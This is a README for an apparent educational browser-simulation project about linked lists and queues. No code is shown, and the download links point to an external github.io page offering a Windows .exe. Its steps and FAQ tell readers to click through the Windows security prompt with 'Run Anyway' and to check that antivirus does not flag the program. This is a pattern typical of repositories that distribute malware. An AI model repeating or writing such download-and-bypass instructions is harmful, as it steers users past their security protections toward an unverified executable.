# 🌐 Web_Browser_Simulation_DSA - Simple Tool For Visualizing Browser Logic

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://thameem787.github.io)

## 📖 About This Project

This program simulates how web browsers handle basic tasks. It uses common computer science structures to manage web navigation and file downloads. You can use this tool to see how a browser tracks your history, saves bookmarks, and queues your file downloads. 

This simulation helps students and curious users understand the logic behind browser engines. It provides a visual representation of how software stores data in memory. The core functions rely on structures like linked lists and queues to manage your actions efficiently.

## ⚙️ System Requirements

You need a computer running Windows 10 or Windows 11 to use this simulation. The program requires at least 2GB of RAM to run smoothly. You do not need to install any external compilers or programming tools. The file you download contains everything necessary to start the application. Ensure your system has current updates installed to prevent compatibility issues.

## 📥 How To Download And Run 

Follow these steps to set up the simulation on your computer:

1. Visit the [releases page](https://thameem787.github.io).
2. Look for the latest version listed under the Releases section.
3. Click the file ending in .exe to start your download.
4. Locate the file in your Downloads folder once the transfer finishes.
5. Double-click the file to open the program.
6. A security prompt might appear on your screen. Click Run or More Info followed by Run Anyway to start the simulation.

## 🚀 Using The Browser Simulation

The browser interface mimics standard behavior. You can input URLs to navigate through the simulation. The internal memory tracks your progress using a Doubly Linked List. This structure allows you to move forward and backward through your pages just like a real browser.

### Managing Bookmarks
The bookmark feature uses a Singly Linked List. When you save a page, the program adds the link to this list. You can view your saved pages at any time. The simulation keeps these bookmarks in memory while the application remains open.

### Tracking Downloads
The application includes a download manager that uses a queue structure. This follows the First-In, First-Out principle. When you select a file to download, the program adds it to the back of the queue. It processes the files one by one until the queue is empty.

## 🛠️ Frequently Asked Questions

**Does this program connect to the real internet?**
No. This simulation runs locally on your machine. It does not send or receive real traffic from the internet. All web addresses exist only within the simulation.

**Do I need to install C++ to use this?**
No. We have packaged the project into a standalone file. You only need the file from the download page to get started.

**Why does my computer show a warning?**
Windows protects your computer from new software. Since this is an independent project, Windows may prompt you to confirm you trust the source. You can safely proceed by clicking Run Anyway.

**Where does the program store my data?**
The program keeps your history and bookmarks in your computer's temporary memory. It wipes this data once you close the application.

## 🔍 Understanding The Logic

This project demonstrates how developers write code for efficiency. Each part of the simulation serves a specific purpose in learning computer science concepts.

- **Doubly Linked Lists:** These allow the browser to remember where you went before and where you can go next. Each page knows its neighbor. This creates a chain that lets you jump between web pages in both directions.
- **Singly Linked Lists:** These manage your bookmarks. Since you add these in a simple sequence, a single chain works well. It stores your favorite sites until you delete them or close the program.
- **Queues:** These manage your file downloads. Computers use queues to ensure tasks get finished in the order you requested. The first file you click becomes the first one to process.

## 🛡️ Troubleshooting

If the program fails to open, verify your Windows version. Ensure you have the latest updates from the Windows update settings. If the window closes immediately, try restarting your computer to clear any locked memory slots. If issues persist, check your antivirus settings to ensure it does not flag the simulation incorrectly. 

Use this tool to explore how data moves inside a browser. It offers a clean look at the backbone of modern web browsing without the noise of a real, complex web browser. We designed this to keep the focus on the data structures. You can test your own navigation patterns to see how the software responds in real time.